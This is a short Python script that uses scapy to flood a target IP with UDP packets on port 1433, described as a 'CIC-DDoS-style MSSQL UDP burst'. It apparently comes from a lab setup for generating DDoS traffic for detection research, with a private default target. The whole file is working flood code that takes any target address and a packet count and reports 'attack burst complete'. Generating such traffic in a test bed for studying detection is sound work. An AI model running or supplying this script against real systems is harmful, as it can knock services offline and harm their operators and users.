#!/home/deep/files/arf_ddos/venv/bin/python
import argparse
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning, module="scapy")

from scapy.all import IP, UDP, Raw, send
from random import randint

DEFAULT_TARGET = '10.0.0.1'


def main():
    parser = argparse.ArgumentParser(description='Send a CIC-DDoS-style MSSQL UDP burst.')
    parser.add_argument('target', nargs='?', default=DEFAULT_TARGET)
    parser.add_argument('--count', type=int, default=20000)
    args = parser.parse_args()
    if args.count < 1:
        parser.error('count must be positive')

    print(f'[MSSQL] sending {args.count} UDP packets to {args.target}:1433', flush=True)
    for _ in range(args.count):
        pkt = IP(dst=args.target) / UDP(dport=1433, sport=randint(1024, 65535)) / Raw(load=b'X' * 140)
        send(pkt, verbose=0)
    print('[MSSQL] attack burst complete', flush=True)


if __name__ == '__main__':
    main()
